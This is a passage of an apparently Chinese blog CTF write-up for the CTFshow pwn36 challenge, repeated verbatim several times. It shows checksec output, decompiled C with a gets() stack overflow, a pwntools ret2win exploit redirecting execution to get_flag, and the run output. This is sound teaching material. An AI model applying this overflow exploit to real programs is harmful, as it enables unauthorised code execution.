class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-6"><a href="#pwn36-6" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-7"><a href="#pwn36-7" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-8"><a href="#pwn36-8" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-9"><a href="#pwn36-9" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-10"><a href="#pwn36-10" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span 